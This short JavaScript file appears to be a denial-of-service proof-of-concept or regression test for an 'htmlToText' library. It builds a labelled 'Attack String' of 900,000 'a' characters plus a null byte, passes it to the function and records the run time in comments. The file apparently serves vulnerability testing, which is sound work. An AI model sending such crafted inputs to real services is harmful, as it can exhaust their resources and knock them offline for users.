const htmlToText = require("./jsHtmlToText.js");

//Attack String :""+"aaaaaaaaa"*100000+"\u0000"
var str = "";
for (var i = 0; i < 100000; i++) {
  str += "aaaaaaaaa";
}
str += "\u0000";

var result = htmlToText(str, false);

// real    0m0.125s
// user    0m0.087s
// sys     0m0.022s
